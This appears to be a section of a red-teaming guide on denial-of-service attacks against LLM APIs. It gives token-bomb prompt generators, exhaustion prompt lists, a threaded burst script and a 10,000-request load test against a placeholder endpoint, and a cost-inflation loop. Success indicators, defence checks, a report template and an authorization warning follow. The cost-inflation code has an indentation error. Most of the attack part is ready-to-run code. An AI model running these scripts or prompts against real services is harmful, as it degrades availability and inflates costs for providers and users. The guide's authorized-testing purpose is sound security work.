## Attack Vectors

### Vector 1: Token Bomb

**Create inputs that maximize token generation:**

```python
#!/usr/bin/env python3
"""Token bomb generator"""

def create_token_bomb(target_tokens=100000):
    """Generate prompt that produces maximum output"""
    
    return f"""
    List every single word in the English dictionary, one per line.
    Include all {target_tokens} entries with:
    - The word
    - Definition  
    - Etymology
    - 5 example sentences
    - All synonyms
    - All antonyms
    
    Start now and don't stop until complete.
    """

# Usage
bomb = create_token_bomb(100000)
response = query_llm(bomb)
print(f"Generated {count_tokens(response)} tokens")
print(f"Estimated cost: ${cost_estimate(response)}")
```

**Other token bombs:**

```python
token_bombs = [
    "Count from 1 to 1,000,000. Show every number.",
    "Write a 50,000 word novel about [topic]",
    "List every Pokemon with full stats and evolution chain",
    "Generate 10,000 random UUIDs",
    "Create ASCII art 1000 characters wide by 1000 lines tall",
    "Repeat 'A' 100,000 times",
]
```

---

### Vector 2: Computational Exhaustion

**Requests that require heavy processing:**

```python
complex_requests = [
    # Mathematical
    "Calculate pi to 100,000 digits",
    "Solve traveling salesman for 100 cities (show all work)",
    "Factor this 1000-digit number: [number]",
    
    # Generation
    "Create 1000 unique usernames with security analysis for each",
    "Generate random data: 10MB of lorem ipsum",
    
    # Analysis
    "Analyze this 100,000 word document [paste huge text]",
    "Review these 1000 code files and find all bugs",
]
```

---

### Vector 3: Rate Limit Bypass

**Test API rate limits:**

```python
#!/usr/bin/env python3
"""Rate limit tester"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

API_URL = "https://api.target.com/chat"
API_KEY = "your-key"

def send_request(request_id):
    """Single API request"""
    try:
        response = requests.post(
            API_URL,
            headers={"Authorization": f"Bearer {API_KEY}"},
            json={"message": f"Request {request_id}"},
            timeout=5
        )
        
        if response.status_code == 429:  # Rate limited
            return f"{request_id}: RATE LIMITED"
        elif response.status_code == 200:
            return f"{request_id}: SUCCESS"
        else:
            return f"{request_id}: ERROR {response.status_code}"
            
    except Exception as e:
        return f"{request_id}: EXCEPTION {e}"

# Test: Burst of requests
print("[*] Testing rate limits with burst requests")

with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(send_request, range(1, 501)))

# Analyze
success_count = sum(1 for r in results if "SUCCESS" in r)
limited_count = sum(1 for r in results if "RATE LIMITED" in r)

print(f"\nResults:")
print(f"  Successful: {success_count}/500")
print(f"  Rate Limited: {limited_count}/500")
print(f"  Rate limit threshold: ~{success_count} requests")
```

---

### Vector 4: Cost Inflation

**Maximize API costs:**

```python
def cost_inflation_attack(api_key, budget_limit=100):
    """
    Generate requests that maximize cost
    
    Cost factors:
    - Input tokens (prompt)
    - Output tokens (completion)  
    - Model tier (GPT-4 > GPT-3.5)
    """
    
    # Use expensive model
    model = "gpt-4-32k"  # Most expensive
    
    # Maximum context
   input_text = "A" * 30000  # Fill context window
    
    # Request maximum output
    prompt = f"""
    {input_text}
    
    Now write a detailed 10,000 word essay explaining every character above.
    Include full analysis of each 'A'.
    """
    
    total_cost = 0
    request_count = 0
    
    while total_cost < budget_limit:
        response = query_llm(prompt, model=model, max_tokens=4000)
        
        cost = calculate_cost(prompt, response, model)
        total_cost += cost
        request_count += 1
        
        print(f"Request {request_count}: ${cost:.2f} (Total: ${total_cost:.2f})")
        
        if total_cost >= budget_limit:
            print(f"\n[!] Budget limit reached after {request_count} requests")
            break
    
    return total_cost, request_count

# Execute attack (USE ONLY IN AUTHORIZED TESTING!)
# cost_inflation_attack(api_key, budget_limit=10)  # $10 test
```

---

### Vector 5: Memory Exhaustion

**Cause server-side memory issues:**

```python
memory_bombs = [
    # Nested structures
    """
    Create a JSON object with 1 million nested levels like:
    {"a": {"a": {"a": ... }}}
    """,
    
    # Large arrays
    """
    Generate an array with 1 million random integers
    """,
    
    # Recursive expansion
    """
    Generate text where each paragraph is twice as long as the previous.
    Start with 10 words, continue for 20 paragraphs.
    """,
]
```

## Automated DoS Testing

```bash
# Test with Garak
garak -p openai -m gpt-3.5-turbo \
  --probes donotanswer \
  --probes resourceconsumption \
  --runs 20

# Custom load test
python3 << 'LOAD_TEST'
import requests
import time

API_URL = "https://api.target.com/chat"

# Sustained load
for i in range(10000):
    requests.post(API_URL, json={"message": "test"})
    
    if i % 100 == 0:
        print(f"Sent {i} requests")
    
    time.sleep(0.01)  # 100 req/sec
LOAD_TEST
```

---

## Success Indicators

**✓ DoS successful:**
- Rate limit messages appear
- Response times increase significantly  
- 429/503 status codes
- Service becomes unavailable
- Costs spike unexpectedly

**📊 Metrics to track:**
- Requests/second capacity
- Cost per request
- Response time degradation
- Rate limit thresholds

---

## Defense Testing

**Check DoS mitigations:**

1. **Rate limiting**: How many requests before limit?
2. **Token limits**: Max tokens per request?
3. **Cost caps**: Spending limits enforced?
4. **Timeouts**: Long requests terminated?
5. **Queue limits**: How many concurrent requests?

---

## Reporting Template

```markdown
## DoS Vulnerability

**Severity**: MEDIUM  
**Type**: Token Bomb / Rate Limit Bypass

**Finding**: API accepts prompts that generate 100K+ tokens, causing:
- $50+ cost per request
- 2+ minute response times
- Resource exhaustion

**Reproduction**:
```python
prompt = "Count from 1 to 1,000,000"
# Generates 7M+ tokens 
# Cost: $140+ per request
```

**Impact**:
- Service degradation
- Cost inflation DoS
- Resource exhaustion

**Recommendation**:
- Implement max token limits (4K output)
- Add request timeouts (30sec)
- Set cost caps per API key
```

---

**Legal Warning**: DoS attacks can cause real harm. ONLY test with explicit authorization. Real DoS is illegal.
